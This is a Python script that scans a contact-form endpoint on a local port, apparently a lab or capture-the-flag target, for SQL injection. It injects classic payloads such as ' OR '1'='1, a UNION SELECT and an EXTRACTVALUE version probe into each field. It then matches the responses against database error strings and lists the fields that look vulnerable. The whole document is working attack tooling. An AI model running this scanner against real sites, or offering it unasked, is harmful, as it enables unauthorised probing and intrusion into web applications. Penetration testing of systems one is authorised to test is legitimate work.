import requests
import json
import time
from urllib.parse import quote

# Target URL
url = "http://127.0.0.1:32826/send.php"

# Create session
session = requests.Session()

# Set headers
headers = {
    "Content-Type": "application/x-www-form-urlencoded"
}

# Base values for normal parameters
base_data = {
    "fullname": "Test",
    "email": "test@example.com",
    "phone": "1234567890",
    "subject": "Test",
    "message": "Test"
}

# Payloads to test
payloads = [
    ("Single quote", "'"),
    ("Double quote", '"'),
    ("Special characters", "1\\"),
    ("SQL comment", "'--"),
    ("SQL OR condition", "' OR '1'='1"),
    ("SQL syntax error", "' UNION SELECT 1--"),
    ("Parenthesis mismatch", "')"),
    ("SQL function error", "EXTRACTVALUE(1,CONCAT(0x7e,@@version))")
]

# Parameters to test
params_to_test = ["fullname", "email", "phone", "subject", "message"]

# SQL error patterns to detect
sql_error_patterns = [
    "SQL syntax",
    "mysql",
    "database",
    "error",
    "SQLSTATE",
    "syntax error",
    "exception",
    "warning",
    "ORA-",
    "PostgreSQL",
    "SQLite",
    "Microsoft OLE DB",
    "ODBC",
    "SQL Server",
    "Incorrect syntax"
]

# Store results
results = {}

# Test each parameter
for param in params_to_test:
    print(f"\n{'='*80}")
    print(f"Testing parameter: {param}")
    print(f"{'='*80}")
    
    results[param] = {}
    
    for payload_name, payload_value in payloads:
        print(f"\n[{payload_name}] Testing payload: {payload_value}")
        
        # Create test data - use base values for all except current parameter
        test_data = base_data.copy()
        test_data[param] = payload_value
        
        try:
            # Send POST request
            start_time = time.time()
            response = session.post(
                url,
                data=test_data,
                headers=headers,
                timeout=10,
                allow_redirects=False
            )
            end_time = time.time()
            
            response_time = end_time - start_time
            
            # Capture response details
            status_code = response.status_code
            response_text = response.text
            response_headers = dict(response.headers)
            
            # Look for SQL error patterns
            detected_errors = []
            for pattern in sql_error_patterns:
                if pattern.lower() in response_text.lower():
                    detected_errors.append(pattern)
            
            # Store result
            results[param][payload_name] = {
                "payload": payload_value,
                "status_code": status_code,
                "response_time": round(response_time, 2),
                "sql_errors_detected": detected_errors,
                "response_length": len(response_text),
                "response_preview": response_text[:500] if len(response_text) > 500 else response_text
            }
            
            # Print results
            print(f"  Status Code: {status_code}")
            print(f"  Response Time: {response_time:.2f}s")
            print(f"  Response Length: {len(response_text)} bytes")
            if detected_errors:
                print(f"  [!] SQL ERRORS DETECTED: {', '.join(detected_errors)}")
            print(f"  Response Preview: {response_text[:300].replace(chr(10), ' ').replace(chr(13), ' ')}")
            
        except requests.exceptions.Timeout:
            print(f"  [ERROR] Request timed out after 10 seconds")
            results[param][payload_name] = {
                "payload": payload_value,
                "status_code": "TIMEOUT",
                "error": "Request timed out after 10 seconds"
            }
        except requests.exceptions.RequestException as e:
            print(f"  [ERROR] Request failed: {str(e)}")
            results[param][payload_name] = {
                "payload": payload_value,
                "status_code": "ERROR",
                "error": str(e)
            }

# Summary analysis
print(f"\n{'='*80}")
print("SUMMARY - POTENTIALLY VULNERABLE PARAMETERS")
print(f"{'='*80}")

vulnerable_params = {}
for param, payload_results in results.items():
    vulnerable_payloads = []
    for payload_name, result in payload_results.items():
        if isinstance(result, dict) and result.get("sql_errors_detected"):
            vulnerable_payloads.append({
                "payload_name": payload_name,
                "payload_value": result["payload"],
                "errors": result["sql_errors_detected"]
            })
    
    if vulnerable_payloads:
        vulnerable_params[param] = vulnerable_payloads
        print(f"\n[+] Parameter '{param}' shows SQL error responses:")
        for vp in vulnerable_payloads:
            print(f"  - {vp['payload_name']}: {vp['payload_value']}")
            print(f"    Errors: {', '.join(vp['errors'])}")
    else:
        print(f"\n[-] Parameter '{param}' - No SQL errors detected")

# Print full results in JSON format for analysis
print(f"\n{'='*80}")
print("FULL RESULTS (JSON)")
print(f"{'='*80}")
print(json.dumps(results, indent=2, default=str))

# Close session
session.close()

